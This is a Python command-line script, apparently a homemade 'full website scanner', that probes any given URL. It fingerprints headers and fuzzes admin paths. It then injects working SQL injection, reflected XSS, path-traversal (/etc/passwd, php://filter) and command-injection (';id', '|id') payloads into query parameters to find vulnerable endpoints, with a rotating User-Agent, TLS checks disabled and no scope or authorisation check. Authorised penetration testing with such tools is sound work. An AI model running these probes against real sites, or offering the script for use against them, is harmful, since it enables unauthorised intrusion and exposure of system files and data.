#!/usr/bin/env python3
import requests
import sys
import random
import string
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from requests.exceptions import RequestException, Timeout, ConnectionError

# Force UTF-8 encoding (for Windows terminals)
try:
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

class FullWebsiteScanner:
    def __init__(self, target):
        self.target = target if target.startswith(('http://', 'https://')) else 'http://' + target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
            ])
        })
        self.results = {
            'ssl': False,
            'headers': {},
            'fuzzed_paths': [],
            'vulnerable_sqli': [],
            'vulnerable_xss': [],
            'vulnerable_lfi_rfi': [],
            'vulnerable_command_injection': []
        }
        self.scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    def safe_get(self, url, timeout=5):
        try:
            return self.session.get(url, verify=False, timeout=timeout)
        except (Timeout, ConnectionError, RequestException):
            return None

    def valid_href(self, href):
        if not href:
            return False
        href = href.lower()
        return not (href.startswith('javascript:') or href.startswith('#') or href.startswith('mailto:'))

    def gather_information(self):
        print("\n[INFO] Gathering Basic Website Info...")
        resp = self.safe_get(self.target, timeout=10)
        if not resp:
            print("  [-] Could not connect to target.")
            return

        final_url = resp.url
        if final_url.startswith('https://'):
            print("  [✔] SSL/HTTPS is supported")
            self.results['ssl'] = True
        else:
            print("  [!] SSL/HTTPS NOT supported")
            self.results['ssl'] = False

        important_headers = ['Server', 'Content-Type', 'X-Powered-By', 'Set-Cookie']
        for header in important_headers:
            if header in resp.headers:
                self.results['headers'][header] = resp.headers[header]
                print(f"  [Header] {header}: {resp.headers[header]}")

    def url_fuzzer(self):
        print("\n[INFO] Starting URL Fuzzing...")
        common_paths = ['admin', 'login', 'dashboard', 'uploads', 'config', 'api', 'portal', 'cpanel', 'phpmyadmin']
        for path in common_paths:
            url = f"{self.target.rstrip('/')}/{path}"
            resp = self.safe_get(url)
            if resp and resp.status_code in [200, 301, 302]:
                print(f"  [FOUND] {url}")
                self.results['fuzzed_paths'].append(url)

    def sqli_tester(self):
        print("\n[INFO] Starting SQL Injection Testing...")
        resp = self.safe_get(self.target)
        if not resp:
            print("  [-] Skipping SQLi test (Target unreachable)")
            return

        soup = BeautifulSoup(resp.text, 'html.parser')
        links = [a['href'] for a in soup.find_all('a', href=True) if self.valid_href(a['href'])]
        payload = "' OR '1'='1"

        for href in links:
            full_url = urllib.parse.urljoin(self.target, href)
            parsed = urlparse(full_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    inj_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, inj_query, parsed.fragment))
                    test_resp = self.safe_get(test_url)
                    if test_resp and any(err in test_resp.text.lower() for err in ["sql", "syntax", "mysql", "warning"]):
                        print(f"  [VULNERABLE] SQLi at {test_url}")
                        self.results['vulnerable_sqli'].append(test_url)

    def xss_tester(self):
        print("\n[INFO] Starting XSS Testing...")
        resp = self.safe_get(self.target)
        if not resp:
            print("  [-] Skipping XSS test (Target unreachable)")
            return

        soup = BeautifulSoup(resp.text, 'html.parser')
        links = [a['href'] for a in soup.find_all('a', href=True) if self.valid_href(a['href'])]
        scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        payload = f"<script>alert('{scan_id}')</script>"

        for href in links:
            full_url = urllib.parse.urljoin(self.target, href)
            parsed = urlparse(full_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    inj_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, inj_query, parsed.fragment))
                    test_resp = self.safe_get(test_url)
                    if test_resp and payload in test_resp.text:
                        print(f"  [VULNERABLE] XSS at {test_url}")
                        self.results['vulnerable_xss'].append(test_url)

    def lfi_rfi_tester(self):
        print("\n[INFO] Starting LFI/RFI Testing...")
        payloads = ["../../../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"]
        resp = self.safe_get(self.target)
        if not resp:
            print("  [-] Skipping LFI/RFI test (Target unreachable)")
            return

        soup = BeautifulSoup(resp.text, 'html.parser')
        links = [a['href'] for a in soup.find_all('a', href=True) if self.valid_href(a['href'])]

        for href in links:
            full_url = urllib.parse.urljoin(self.target, href)
            parsed = urlparse(full_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param] = payload
                        inj_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, inj_query, parsed.fragment))
                        test_resp = self.safe_get(test_url)
                        if test_resp and ("root:x:" in test_resp.text or "base64" in test_resp.text):
                            print(f"  [VULNERABLE] LFI/RFI at {test_url}")
                            self.results['vulnerable_lfi_rfi'].append(test_url)
                            break

    def command_injection_tester(self):
        print("\n[INFO] Starting Command Injection Testing...")
        payloads = [";id", "|id", "&id"]
        resp = self.safe_get(self.target)
        if not resp:
            print("  [-] Skipping Command Injection test (Target unreachable)")
            return

        soup = BeautifulSoup(resp.text, 'html.parser')
        links = [a['href'] for a in soup.find_all('a', href=True) if self.valid_href(a['href'])]

        for href in links:
            full_url = urllib.parse.urljoin(self.target, href)
            parsed = urlparse(full_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param] = payload
                        inj_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, inj_query, parsed.fragment))
                        test_resp = self.safe_get(test_url)
                        if test_resp and "uid=" in test_resp.text:
                            print(f"  [VULNERABLE] Command Injection at {test_url}")
                            self.results['vulnerable_command_injection'].append(test_url)
                            break

    def generate_report(self):
        print("\n" + "="*60)
        print("FULL WEBSITE SCAN REPORT")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"Scan ID: {self.scan_id}\n")

        print(f"[SSL Supported]: {'Yes' if self.results['ssl'] else 'No'}")
        print("\n[HTTP Headers]")
        for header, value in self.results['headers'].items():
            print(f"  - {header}: {value}")

        print("\n[Discovered Paths]")
        for path in self.results['fuzzed_paths']:
            print(f" - {path}")

        print("\n[SQL Injection Vulnerabilities]")
        for sqli in self.results['vulnerable_sqli']:
            print(f" - {sqli}")

        print("\n[XSS Vulnerabilities]")
        for xss in self.results['vulnerable_xss']:
            print(f" - {xss}")

        print("\n[LFI/RFI Vulnerabilities]")
        for lfi in self.results['vulnerable_lfi_rfi']:
            print(f" - {lfi}")

        print("\n[Command Injection Vulnerabilities]")
        for ci in self.results['vulnerable_command_injection']:
            print(f" - {ci}")

        print("\n✅ Scan Complete!\n")

    def run_full_scan(self):
        self.gather_information()
        self.url_fuzzer()
        self.sqli_tester()
        self.xss_tester()
        self.lfi_rfi_tester()
        self.command_injection_tester()
        self.generate_report()

def main():
    if len(sys.argv) != 2:
        print("Usage: python full_Scan.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    scanner = FullWebsiteScanner(target)
    scanner.run_full_scan()

if __name__ == "__main__":
    main()
